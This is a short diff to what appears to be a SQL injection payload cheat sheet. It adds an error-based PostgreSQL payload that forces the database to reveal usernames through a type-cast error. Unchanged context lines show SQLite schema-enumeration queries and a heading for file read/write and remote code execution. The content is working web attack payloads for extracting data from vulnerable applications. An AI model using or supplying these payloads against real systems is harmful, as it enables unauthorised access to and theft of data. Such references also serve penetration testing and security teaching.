@@ -59,6 +59,14 @@ SELECT sql FROM sqlite_master WHERE tbl_name='users';
 SELECT GROUP_CONCAT(name,',') FROM PRAGMA_TABLE_INFO('users');
 ```
 
+## Error based
+
+### PostgreSQL
+
+```
+' AND 1=CAST((SELECT username FROM users) AS int)--
+```
+
 ## File read/write & RCE
 
 ### PostgreSQL
